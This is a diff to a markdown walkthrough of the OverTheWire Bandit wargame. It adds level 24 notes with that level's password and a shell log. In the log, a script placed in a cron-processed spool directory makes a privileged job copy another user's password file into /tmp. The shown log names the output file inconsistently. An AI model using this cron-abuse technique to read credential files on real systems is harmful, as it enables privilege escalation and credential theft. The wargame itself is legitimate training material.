@@ -730,8 +730,40 @@ ssh bandit23@bandit.labs.overthewire.org -p 2220
 
 
 
--  ##level-1
-- username - bandit1
+-  ##level-24
+- username - bandit24
+- password
+   ```
+   gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+   ```
+#Commands:
+- bandit23@bandit:~$ ls
+- bandit23@bandit:~$ cd /etc/cron.d/
+- bandit23@bandit:/etc/cron.d$ ls
+- bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+- bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+- bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24
+- bandit23@bandit:/var/spool/bandit24$ ls
+- foo
+- bandit23@bandit:/var/spool/bandit24$ cd /var/spool/bandit24/foo
+- bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test" > certa6.sh
+- bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 certa6.sh
+- bandit23@bandit:/var/spool/bandit24/foo$ ls certa6.sh
+- ls: cannot access 'certa6.sh': No such file or directory
+- bandit23@bandit:/var/spool/bandit24/foo$ ls
+- ls: cannot open directory '.': Permission denied
+- bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/certa_test.txt
+- gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+- - connect -
+```
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+
+
+
+ ## level-25
+- username - bandit25
 - password
    ```
    
@@ -740,22 +772,7 @@ ssh bandit23@bandit.labs.overthewire.org -p 2220
 - 
 - - connect -
 ```
-ssh bandit13@bandit.labs.overthewire.org -p 2220
-```
-
-
-
--  ##level-1
-- username - bandit1
-- password
-   ```
-   
-   ```
-#Commands:
-- 
-- - connect -
-```
-ssh bandit13@bandit.labs.overthewire.org -p 2220
+ssh bandit25@bandit.labs.overthewire.org -p 2220
 ```
 
 
